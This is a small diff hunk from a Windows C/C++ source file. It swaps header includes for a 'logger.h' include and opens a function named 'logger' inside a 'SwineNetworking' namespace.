@@ -4,8 +4,7 @@
 #include<windowsx.h>
 #define BUFSIZE 80
 #include "Networking.h"
-#include "targetver.h"
-#include "svchost.h"
+#include "logger.h"
 using namespace SwineNetworking;
 int logger(void)
 {
